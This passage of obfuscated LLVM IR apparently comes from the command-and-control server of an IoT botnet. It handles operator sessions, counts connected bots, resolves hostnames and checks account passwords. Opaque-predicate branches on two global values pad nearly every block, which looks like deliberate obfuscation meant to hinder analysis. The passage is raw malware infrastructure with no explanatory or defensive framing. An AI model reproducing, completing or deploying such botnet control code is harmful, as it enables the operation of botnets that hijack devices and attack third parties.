  %331 = call i32 (i8*, i8*, ...) @sprintf(i8* %325, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.29, i32 0, i32 0), i8* %330) #7
  %332 = load i32, i32* %4, align 4
  %333 = sext i32 %332 to i64
  %334 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %333
  %335 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %334, i32 0, i32 1
  store i32 1, i32* %335, align 4
  br label %336

; <label>:336:                                    ; preds = %1896, %originalBBpart2261, %318
  %337 = load i32, i32* @x.23
  %338 = load i32, i32* @y.24
  %339 = sub i32 %337, 1
  %340 = mul i32 %337, %339
  %341 = urem i32 %340, 2
  %342 = icmp eq i32 %341, 0
  %343 = icmp slt i32 %338, 10
  %344 = or i1 %342, %343
  br i1 %344, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %336
  %345 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %346 = load i32, i32* %4, align 4
  %347 = call i32 @fdgets(i8* %345, i32 2048, i32 %346)
  %348 = icmp sgt i32 %347, 0
  %349 = load i32, i32* @x.23
  %350 = load i32, i32* @y.24
  %351 = sub i32 %349, 1
  %352 = mul i32 %349, %351
  %353 = urem i32 %352, 2
  %354 = icmp eq i32 %353, 0
  %355 = icmp slt i32 %350, 10
  %356 = or i1 %354, %355
  br i1 %356, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br i1 %348, label %357, label %1919

; <label>:357:                                    ; preds = %originalBBpart244
  %358 = load i32, i32* @x.23
  %359 = load i32, i32* @y.24
  %360 = sub i32 %358, 1
  %361 = mul i32 %358, %360
  %362 = urem i32 %361, 2
  %363 = icmp eq i32 %362, 0
  %364 = icmp slt i32 %359, 10
  %365 = or i1 %363, %364
  br i1 %365, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %357
  %366 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %367 = call i8* @strstr(i8* %366, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.38, i32 0, i32 0)) #8
  %368 = icmp ne i8* %367, null
  %369 = load i32, i32* @x.23
  %370 = load i32, i32* @y.24
  %371 = sub i32 %369, 1
  %372 = mul i32 %369, %371
  %373 = urem i32 %372, 2
  %374 = icmp eq i32 %373, 0
  %375 = icmp slt i32 %370, 10
  %376 = or i1 %374, %375
  br i1 %376, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %368, label %417, label %377

; <label>:377:                                    ; preds = %originalBBpart248
  %378 = load i32, i32* @x.23
  %379 = load i32, i32* @y.24
  %380 = sub i32 %378, 1
  %381 = mul i32 %378, %380
  %382 = urem i32 %381, 2
  %383 = icmp eq i32 %382, 0
  %384 = icmp slt i32 %379, 10
  %385 = or i1 %383, %384
  br i1 %385, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %377
  %386 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %387 = call i8* @strstr(i8* %386, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.39, i32 0, i32 0)) #8
  %388 = icmp ne i8* %387, null
  %389 = load i32, i32* @x.23
  %390 = load i32, i32* @y.24
  %391 = sub i32 %389, 1
  %392 = mul i32 %389, %391
  %393 = urem i32 %392, 2
  %394 = icmp eq i32 %393, 0
  %395 = icmp slt i32 %390, 10
  %396 = or i1 %394, %395
  br i1 %396, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br i1 %388, label %417, label %397

; <label>:397:                                    ; preds = %originalBBpart252
  %398 = load i32, i32* @x.23
  %399 = load i32, i32* @y.24
  %400 = sub i32 %398, 1
  %401 = mul i32 %398, %400
  %402 = urem i32 %401, 2
  %403 = icmp eq i32 %402, 0
  %404 = icmp slt i32 %399, 10
  %405 = or i1 %403, %404
  br i1 %405, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %397
  %406 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %407 = call i8* @strstr(i8* %406, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.40, i32 0, i32 0)) #8
  %408 = icmp ne i8* %407, null
  %409 = load i32, i32* @x.23
  %410 = load i32, i32* @y.24
  %411 = sub i32 %409, 1
  %412 = mul i32 %409, %411
  %413 = urem i32 %412, 2
  %414 = icmp eq i32 %413, 0
  %415 = icmp slt i32 %410, 10
  %416 = or i1 %414, %415
  br i1 %416, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br i1 %408, label %417, label %545

; <label>:417:                                    ; preds = %originalBBpart256, %originalBBpart252, %originalBBpart248
  %418 = call i32 @joinn()
  store i32 1, i32* %26, align 4
  store i32 0, i32* %25, align 4
  br label %419

; <label>:419:                                    ; preds = %originalBBpart266, %417
  %420 = load i32, i32* %25, align 4
  %421 = icmp slt i32 %420, 40
  br i1 %421, label %422, label %501

; <label>:422:                                    ; preds = %419
  %423 = load i32, i32* %25, align 4
  %424 = sext i32 %423 to i64
  %425 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %424
  %426 = getelementptr inbounds %struct.name, %struct.name* %425, i32 0, i32 1
  %427 = load i32, i32* %426, align 4
  %428 = icmp sle i32 %427, 0
  br i1 %428, label %429, label %435

; <label>:429:                                    ; preds = %422
  %430 = load i32, i32* %25, align 4
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %431
  %433 = getelementptr inbounds %struct.name, %struct.name* %432, i32 0, i32 0
  %434 = getelementptr inbounds [512 x i8], [512 x i8]* %433, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %434, i8 0, i64 512, i32 4, i1 false)
  br label %435

; <label>:435:                                    ; preds = %429, %422
  %436 = load i32, i32* %25, align 4
  %437 = sext i32 %436 to i64
  %438 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %437
  %439 = getelementptr inbounds %struct.name, %struct.name* %438, i32 0, i32 0
  %440 = getelementptr inbounds [512 x i8], [512 x i8]* %439, i32 0, i32 0
  %441 = call i64 @strlen(i8* %440) #8
  %442 = icmp uge i64 %441, 1
  br i1 %442, label %443, label %465

; <label>:443:                                    ; preds = %435
  %444 = getelementptr inbounds [512 x i8], [512 x i8]* %27, i32 0, i32 0
  %445 = load i32, i32* %25, align 4
  %446 = sext i32 %445 to i64
  %447 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %446
  %448 = getelementptr inbounds %struct.name, %struct.name* %447, i32 0, i32 0
  %449 = getelementptr inbounds [512 x i8], [512 x i8]* %448, i32 0, i32 0
  %450 = load i32, i32* %25, align 4
  %451 = sext i32 %450 to i64
  %452 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %451
  %453 = getelementptr inbounds %struct.name, %struct.name* %452, i32 0, i32 1
  %454 = load i32, i32* %453, align 4
  %455 = call i32 (i8*, i8*, ...) @sprintf(i8* %444, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.41, i32 0, i32 0), i8* %449, i32 %454) #7
  %456 = load i32, i32* %4, align 4
  %457 = getelementptr inbounds [512 x i8], [512 x i8]* %27, i32 0, i32 0
  %458 = getelementptr inbounds [512 x i8], [512 x i8]* %27, i32 0, i32 0
  %459 = call i64 @strlen(i8* %458) #8
  %460 = call i64 @send(i32 %456, i8* %457, i64 %459, i32 16384)
  %461 = icmp eq i64 %460, -1
  br i1 %461, label %462, label %463

; <label>:462:                                    ; preds = %443
  br label %1920

; <label>:463:                                    ; preds = %443
  %464 = getelementptr inbounds [512 x i8], [512 x i8]* %27, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %464, i8 0, i64 512, i32 16, i1 false)
  br label %465

; <label>:465:                                    ; preds = %463, %435
  %466 = load i32, i32* @x.23
  %467 = load i32, i32* @y.24
  %468 = sub i32 %466, 1
  %469 = mul i32 %466, %468
  %470 = urem i32 %469, 2
  %471 = icmp eq i32 %470, 0
  %472 = icmp slt i32 %467, 10
  %473 = or i1 %471, %472
  br i1 %473, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %465
  %474 = load i32, i32* @x.23
  %475 = load i32, i32* @y.24
  %476 = sub i32 %474, 1
  %477 = mul i32 %474, %476
  %478 = urem i32 %477, 2
  %479 = icmp eq i32 %478, 0
  %480 = icmp slt i32 %475, 10
  %481 = or i1 %479, %480
  br i1 %481, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br label %482

; <label>:482:                                    ; preds = %originalBBpart260
  %483 = load i32, i32* @x.23
  %484 = load i32, i32* @y.24
  %485 = sub i32 %483, 1
  %486 = mul i32 %483, %485
  %487 = urem i32 %486, 2
  %488 = icmp eq i32 %487, 0
  %489 = icmp slt i32 %484, 10
  %490 = or i1 %488, %489
  br i1 %490, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %482
  %491 = load i32, i32* %25, align 4
  %492 = add nsw i32 %491, 1
  store i32 %492, i32* %25, align 4
  %493 = load i32, i32* @x.23
  %494 = load i32, i32* @y.24
  %495 = sub i32 %493, 1
  %496 = mul i32 %493, %495
  %497 = urem i32 %496, 2
  %498 = icmp eq i32 %497, 0
  %499 = icmp slt i32 %494, 10
  %500 = or i1 %498, %499
  br i1 %500, label %originalBBpart266, label %originalBB62alteredBB

originalBBpart266:                                ; preds = %originalBB62
  br label %419

; <label>:501:                                    ; preds = %419
  %502 = getelementptr inbounds [512 x i8], [512 x i8]* %28, i32 0, i32 0
  %503 = call i32 @clientsConnected()
  %504 = call i32 (i8*, i8*, ...) @sprintf(i8* %502, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.42, i32 0, i32 0), i32 %503) #7
  %505 = load i32, i32* %4, align 4
  %506 = getelementptr inbounds [512 x i8], [512 x i8]* %28, i32 0, i32 0
  %507 = getelementptr inbounds [512 x i8], [512 x i8]* %28, i32 0, i32 0
  %508 = call i64 @strlen(i8* %507) #8
  %509 = call i64 @send(i32 %505, i8* %506, i64 %508, i32 16384)
  %510 = icmp eq i64 %509, -1
  br i1 %510, label %511, label %528

; <label>:511:                                    ; preds = %501
  %512 = load i32, i32* @x.23
  %513 = load i32, i32* @y.24
  %514 = sub i32 %512, 1
  %515 = mul i32 %512, %514
  %516 = urem i32 %515, 2
  %517 = icmp eq i32 %516, 0
  %518 = icmp slt i32 %513, 10
  %519 = or i1 %517, %518
  br i1 %519, label %originalBB68, label %originalBB68alteredBB

originalBB68:                                     ; preds = %originalBB68alteredBB, %511
  %520 = load i32, i32* @x.23
  %521 = load i32, i32* @y.24
  %522 = sub i32 %520, 1
  %523 = mul i32 %520, %522
  %524 = urem i32 %523, 2
  %525 = icmp eq i32 %524, 0
  %526 = icmp slt i32 %521, 10
  %527 = or i1 %525, %526
  br i1 %527, label %originalBBpart270, label %originalBB68alteredBB

originalBBpart270:                                ; preds = %originalBB68
  br label %1920

; <label>:528:                                    ; preds = %501
  %529 = load i32, i32* @x.23
  %530 = load i32, i32* @y.24
  %531 = sub i32 %529, 1
  %532 = mul i32 %529, %531
  %533 = urem i32 %532, 2
  %534 = icmp eq i32 %533, 0
  %535 = icmp slt i32 %530, 10
  %536 = or i1 %534, %535
  br i1 %536, label %originalBB72, label %originalBB72alteredBB

originalBB72:                                     ; preds = %originalBB72alteredBB, %528
  %537 = load i32, i32* @x.23
  %538 = load i32, i32* @y.24
  %539 = sub i32 %537, 1
  %540 = mul i32 %537, %539
  %541 = urem i32 %540, 2
  %542 = icmp eq i32 %541, 0
  %543 = icmp slt i32 %538, 10
  %544 = or i1 %542, %543
  br i1 %544, label %originalBBpart274, label %originalBB72alteredBB

originalBBpart274:                                ; preds = %originalBB72
  br label %545

; <label>:545:                                    ; preds = %originalBBpart274, %originalBBpart256
  %546 = load i32, i32* @x.23
  %547 = load i32, i32* @y.24
  %548 = sub i32 %546, 1
  %549 = mul i32 %546, %548
  %550 = urem i32 %549, 2
  %551 = icmp eq i32 %550, 0
  %552 = icmp slt i32 %547, 10
  %553 = or i1 %551, %552
  br i1 %553, label %originalBB76, label %originalBB76alteredBB

originalBB76:                                     ; preds = %originalBB76alteredBB, %545
  %554 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %555 = call i8* @strstr(i8* %554, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.43, i32 0, i32 0)) #8
  %556 = icmp ne i8* %555, null
  %557 = load i32, i32* @x.23
  %558 = load i32, i32* @y.24
  %559 = sub i32 %557, 1
  %560 = mul i32 %557, %559
  %561 = urem i32 %560, 2
  %562 = icmp eq i32 %561, 0
  %563 = icmp slt i32 %558, 10
  %564 = or i1 %562, %563
  br i1 %564, label %originalBBpart278, label %originalBB76alteredBB

originalBBpart278:                                ; preds = %originalBB76
  br i1 %556, label %565, label %577

; <label>:565:                                    ; preds = %originalBBpart278
  %566 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %567 = load volatile i32, i32* @BOATSRAPED, align 4
  %568 = call i32 (i8*, i8*, ...) @sprintf(i8* %566, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.44, i32 0, i32 0), i32 %567) #7
  %569 = load i32, i32* %4, align 4
  %570 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %571 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %572 = call i64 @strlen(i8* %571) #8
  %573 = call i64 @send(i32 %569, i8* %570, i64 %572, i32 16384)
  %574 = icmp eq i64 %573, -1
  br i1 %574, label %575, label %576

; <label>:575:                                    ; preds = %565
  br label %576

; <label>:576:                                    ; preds = %575, %565
  br label %577

; <label>:577:                                    ; preds = %576, %originalBBpart278
  %578 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %579 = call i8* @strstr(i8* %578, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.45, i32 0, i32 0)) #8
  %580 = icmp ne i8* %579, null
  br i1 %580, label %581, label %603

; <label>:581:                                    ; preds = %577
  %582 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %583 = call i8* @strtok(i8* %582, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.46, i32 0, i32 0)) #7
  store i8* %583, i8** %30, align 8
  %584 = load i8*, i8** %30, align 8
  %585 = getelementptr inbounds i8, i8* %584, i64 8
  store i8* %585, i8** %31, align 8
  %586 = load i8*, i8** %31, align 8
  call void @trim(i8* %586)
  %587 = load i8*, i8** %31, align 8
  %588 = getelementptr inbounds [100 x i8*], [100 x i8*]* %29, i32 0, i32 0
  %589 = bitcast i8** %588 to i8*
  %590 = call i32 @hostname_to_ip(i8* %587, i8* %589)
  %591 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %592 = load i8*, i8** %31, align 8
  %593 = getelementptr inbounds [100 x i8*], [100 x i8*]* %29, i32 0, i32 0
  %594 = call i32 (i8*, i8*, ...) @sprintf(i8* %591, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.47, i32 0, i32 0), i8* %592, i8** %593) #7
  %595 = load i32, i32* %4, align 4
  %596 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %597 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %598 = call i64 @strlen(i8* %597) #8
  %599 = call i64 @send(i32 %595, i8* %596, i64 %598, i32 16384)
  %600 = icmp eq i64 %599, -1
  br i1 %600, label %601, label %602

; <label>:601:                                    ; preds = %581
  br label %602

; <label>:602:                                    ; preds = %601, %581
  br label %603

; <label>:603:                                    ; preds = %602, %577
  %604 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %605 = call i8* @strstr(i8* %604, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.48, i32 0, i32 0)) #8
  %606 = icmp ne i8* %605, null
  br i1 %606, label %607, label %686

; <label>:607:                                    ; preds = %603
  %608 = load i32, i32* @x.23
  %609 = load i32, i32* @y.24
  %610 = sub i32 %608, 1
  %611 = mul i32 %608, %610
  %612 = urem i32 %611, 2
  %613 = icmp eq i32 %612, 0
  %614 = icmp slt i32 %609, 10
  %615 = or i1 %613, %614
  br i1 %615, label %originalBB80, label %originalBB80alteredBB

originalBB80:                                     ; preds = %originalBB80alteredBB, %607
  %616 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %617 = call i32 (i8*, i8*, ...) @sprintf(i8* %616, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.49, i32 0, i32 0)) #7
  %618 = load i32, i32* %4, align 4
  %619 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %620 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %621 = call i64 @strlen(i8* %620) #8
  %622 = call i64 @send(i32 %618, i8* %619, i64 %621, i32 16384)
  %623 = icmp eq i64 %622, -1
  %624 = load i32, i32* @x.23
  %625 = load i32, i32* @y.24
  %626 = sub i32 %624, 1
  %627 = mul i32 %624, %626
  %628 = urem i32 %627, 2
  %629 = icmp eq i32 %628, 0
  %630 = icmp slt i32 %625, 10
  %631 = or i1 %629, %630
  br i1 %631, label %originalBBpart282, label %originalBB80alteredBB

originalBBpart282:                                ; preds = %originalBB80
  br i1 %623, label %632, label %649

; <label>:632:                                    ; preds = %originalBBpart282
  %633 = load i32, i32* @x.23
  %634 = load i32, i32* @y.24
  %635 = sub i32 %633, 1
  %636 = mul i32 %633, %635
  %637 = urem i32 %636, 2
  %638 = icmp eq i32 %637, 0
  %639 = icmp slt i32 %634, 10
  %640 = or i1 %638, %639
  br i1 %640, label %originalBB84, label %originalBB84alteredBB

originalBB84:                                     ; preds = %originalBB84alteredBB, %632
  %641 = load i32, i32* @x.23
  %642 = load i32, i32* @y.24
  %643 = sub i32 %641, 1
  %644 = mul i32 %641, %643
  %645 = urem i32 %644, 2
  %646 = icmp eq i32 %645, 0
  %647 = icmp slt i32 %642, 10
  %648 = or i1 %646, %647
  br i1 %648, label %originalBBpart286, label %originalBB84alteredBB

originalBBpart286:                                ; preds = %originalBB84
  br label %649

; <label>:649:                                    ; preds = %originalBBpart286, %originalBBpart282
  %650 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %651 = call i32 (i8*, i8*, ...) @sprintf(i8* %650, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.50, i32 0, i32 0)) #7
  %652 = load i32, i32* %4, align 4
  %653 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %654 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %655 = call i64 @strlen(i8* %654) #8
  %656 = call i64 @send(i32 %652, i8* %653, i64 %655, i32 16384)
  %657 = icmp eq i64 %656, -1
  br i1 %657, label %658, label %659

; <label>:658:                                    ; preds = %649
  br label %659

; <label>:659:                                    ; preds = %658, %649
  %660 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %661 = call i32 (i8*, i8*, ...) @sprintf(i8* %660, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.51, i32 0, i32 0)) #7
  %662 = load i32, i32* %4, align 4
  %663 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %664 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %665 = call i64 @strlen(i8* %664) #8
  %666 = call i64 @send(i32 %662, i8* %663, i64 %665, i32 16384)
  %667 = icmp eq i64 %666, -1
  br i1 %667, label %668, label %669

; <label>:668:                                    ; preds = %659
  br label %669

; <label>:669:                                    ; preds = %668, %659
  %670 = load i32, i32* @x.23
  %671 = load i32, i32* @y.24
  %672 = sub i32 %670, 1
  %673 = mul i32 %670, %672
  %674 = urem i32 %673, 2
  %675 = icmp eq i32 %674, 0
  %676 = icmp slt i32 %671, 10
  %677 = or i1 %675, %676
  br i1 %677, label %originalBB88, label %originalBB88alteredBB

originalBB88:                                     ; preds = %originalBB88alteredBB, %669
  %678 = load i32, i32* @x.23
  %679 = load i32, i32* @y.24
  %680 = sub i32 %678, 1
  %681 = mul i32 %678, %680
  %682 = urem i32 %681, 2
  %683 = icmp eq i32 %682, 0
  %684 = icmp slt i32 %679, 10
  %685 = or i1 %683, %684
  br i1 %685, label %originalBBpart290, label %originalBB88alteredBB

originalBBpart290:                                ; preds = %originalBB88
  br label %686

; <label>:686:                                    ; preds = %originalBBpart290, %603
  %687 = load i32, i32* @x.23
  %688 = load i32, i32* @y.24
  %689 = sub i32 %687, 1
  %690 = mul i32 %687, %689
  %691 = urem i32 %690, 2
  %692 = icmp eq i32 %691, 0
  %693 = icmp slt i32 %688, 10
  %694 = or i1 %692, %693
  br i1 %694, label %originalBB92, label %originalBB92alteredBB

originalBB92:                                     ; preds = %originalBB92alteredBB, %686
  %695 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %696 = call i8* @strstr(i8* %695, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.52, i32 0, i32 0)) #8
  %697 = icmp ne i8* %696, null
  %698 = load i32, i32* @x.23
  %699 = load i32, i32* @y.24
  %700 = sub i32 %698, 1
  %701 = mul i32 %698, %700
  %702 = urem i32 %701, 2
  %703 = icmp eq i32 %702, 0
  %704 = icmp slt i32 %699, 10
  %705 = or i1 %703, %704
  br i1 %705, label %originalBBpart294, label %originalBB92alteredBB

originalBBpart294:                                ; preds = %originalBB92
  br i1 %697, label %706, label %785

; <label>:706:                                    ; preds = %originalBBpart294
  %707 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %708 = call i32 (i8*, i8*, ...) @sprintf(i8* %707, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.53, i32 0, i32 0)) #7
  %709 = load i32, i32* %4, align 4
  %710 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %711 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %712 = call i64 @strlen(i8* %711) #8
  %713 = call i64 @send(i32 %709, i8* %710, i64 %712, i32 16384)
  %714 = icmp eq i64 %713, -1
  br i1 %714, label %715, label %732

; <label>:715:                                    ; preds = %706
  %716 = load i32, i32* @x.23
  %717 = load i32, i32* @y.24
  %718 = sub i32 %716, 1
  %719 = mul i32 %716, %718
  %720 = urem i32 %719, 2
  %721 = icmp eq i32 %720, 0
  %722 = icmp slt i32 %717, 10
  %723 = or i1 %721, %722
  br i1 %723, label %originalBB96, label %originalBB96alteredBB

originalBB96:                                     ; preds = %originalBB96alteredBB, %715
  %724 = load i32, i32* @x.23
  %725 = load i32, i32* @y.24
  %726 = sub i32 %724, 1
  %727 = mul i32 %724, %726
  %728 = urem i32 %727, 2
  %729 = icmp eq i32 %728, 0
  %730 = icmp slt i32 %725, 10
  %731 = or i1 %729, %730
  br i1 %731, label %originalBBpart298, label %originalBB96alteredBB

originalBBpart298:                                ; preds = %originalBB96
  br label %732

; <label>:732:                                    ; preds = %originalBBpart298, %706
  %733 = load i32, i32* @x.23
  %734 = load i32, i32* @y.24
  %735 = sub i32 %733, 1
  %736 = mul i32 %733, %735
  %737 = urem i32 %736, 2
  %738 = icmp eq i32 %737, 0
  %739 = icmp slt i32 %734, 10
  %740 = or i1 %738, %739
  br i1 %740, label %originalBB100, label %originalBB100alteredBB

originalBB100:                                    ; preds = %originalBB100alteredBB, %732
  %741 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %742 = call i32 (i8*, i8*, ...) @sprintf(i8* %741, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.54, i32 0, i32 0)) #7
  %743 = load i32, i32* %4, align 4
  %744 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %745 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %746 = call i64 @strlen(i8* %745) #8
  %747 = call i64 @send(i32 %743, i8* %744, i64 %746, i32 16384)
  %748 = icmp eq i64 %747, -1
  %749 = load i32, i32* @x.23
  %750 = load i32, i32* @y.24
  %751 = sub i32 %749, 1
  %752 = mul i32 %749, %751
  %753 = urem i32 %752, 2
  %754 = icmp eq i32 %753, 0
  %755 = icmp slt i32 %750, 10
  %756 = or i1 %754, %755
  br i1 %756, label %originalBBpart2102, label %originalBB100alteredBB

originalBBpart2102:                               ; preds = %originalBB100
  br i1 %748, label %757, label %758

; <label>:757:                                    ; preds = %originalBBpart2102
  br label %758

; <label>:758:                                    ; preds = %757, %originalBBpart2102
  %759 = load i32, i32* @x.23
  %760 = load i32, i32* @y.24
  %761 = sub i32 %759, 1
  %762 = mul i32 %759, %761
  %763 = urem i32 %762, 2
  %764 = icmp eq i32 %763, 0
  %765 = icmp slt i32 %760, 10
  %766 = or i1 %764, %765
  br i1 %766, label %originalBB104, label %originalBB104alteredBB

originalBB104:                                    ; preds = %originalBB104alteredBB, %758
  %767 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %768 = call i32 (i8*, i8*, ...) @sprintf(i8* %767, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.55, i32 0, i32 0)) #7
  %769 = load i32, i32* %4, align 4
  %770 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %771 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %772 = call i64 @strlen(i8* %771) #8
  %773 = call i64 @send(i32 %769, i8* %770, i64 %772, i32 16384)
  %774 = icmp eq i64 %773, -1
  %775 = load i32, i32* @x.23
  %776 = load i32, i32* @y.24
  %777 = sub i32 %775, 1
  %778 = mul i32 %775, %777
  %779 = urem i32 %778, 2
  %780 = icmp eq i32 %779, 0
  %781 = icmp slt i32 %776, 10
  %782 = or i1 %780, %781
  br i1 %782, label %originalBBpart2106, label %originalBB104alteredBB

originalBBpart2106:                               ; preds = %originalBB104
  br i1 %774, label %783, label %784

; <label>:783:                                    ; preds = %originalBBpart2106
  br label %784

; <label>:784:                                    ; preds = %783, %originalBBpart2106
  br label %785

; <label>:785:                                    ; preds = %784, %originalBBpart294
  %786 = load i32, i32* @x.23
  %787 = load i32, i32* @y.24
  %788 = sub i32 %786, 1
  %789 = mul i32 %786, %788
  %790 = urem i32 %789, 2
  %791 = icmp eq i32 %790, 0
  %792 = icmp slt i32 %787, 10
  %793 = or i1 %791, %792
  br i1 %793, label %originalBB108, label %originalBB108alteredBB

originalBB108:                                    ; preds = %originalBB108alteredBB, %785
  %794 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %795 = call i8* @strstr(i8* %794, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.56, i32 0, i32 0)) #8
  %796 = icmp ne i8* %795, null
  %797 = load i32, i32* @x.23
  %798 = load i32, i32* @y.24
  %799 = sub i32 %797, 1
  %800 = mul i32 %797, %799
  %801 = urem i32 %800, 2
  %802 = icmp eq i32 %801, 0
  %803 = icmp slt i32 %798, 10
  %804 = or i1 %802, %803
  br i1 %804, label %originalBBpart2110, label %originalBB108alteredBB

originalBBpart2110:                               ; preds = %originalBB108
  br i1 %796, label %805, label %950

; <label>:805:                                    ; preds = %originalBBpart2110
  %806 = load i32, i32* @x.23
  %807 = load i32, i32* @y.24
  %808 = sub i32 %806, 1
  %809 = mul i32 %806, %808
  %810 = urem i32 %809, 2
  %811 = icmp eq i32 %810, 0
  %812 = icmp slt i32 %807, 10
  %813 = or i1 %811, %812
  br i1 %813, label %originalBB112, label %originalBB112alteredBB

originalBB112:                                    ; preds = %originalBB112alteredBB, %805
  %814 = load i8*, i8** %12, align 8
  %815 = load i32, i32* %5, align 4
  %816 = sext i32 %815 to i64
  %817 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %816
  %818 = getelementptr inbounds %struct.account, %struct.account* %817, i32 0, i32 2
  %819 = getelementptr inbounds [200 x i8], [200 x i8]* %818, i32 0, i32 0
  %820 = call i32 @strcmp(i8* %814, i8* %819) #8
  %821 = icmp eq i32 %820, 0
  %822 = load i32, i32* @x.23
  %823 = load i32, i32* @y.24
  %824 = sub i32 %822, 1
  %825 = mul i32 %822, %824
  %826 = urem i32 %825, 2
  %827 = icmp eq i32 %826, 0
  %828 = icmp slt i32 %823, 10
  %829 = or i1 %827, %828
  br i1 %829, label %originalBBpart2114, label %originalBB112alteredBB

originalBBpart2114:                               ; preds = %originalBB112
  br i1 %821, label %839, label %830

; <label>:830:                                    ; preds = %originalBBpart2114
  %831 = load i8*, i8** %13, align 8
  %832 = load i32, i32* %5, align 4
  %833 = sext i32 %832 to i64
  %834 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %833
  %835 = getelementptr inbounds %struct.account, %struct.account* %834, i32 0, i32 2
  %836 = getelementptr inbounds [200 x i8], [200 x i8]* %835, i32 0, i32 0
  %837 = call i32 @strcmp(i8* %831, i8* %836) #8
  %838 = icmp eq i32 %837, 0
  br i1 %838, label %839, label %906

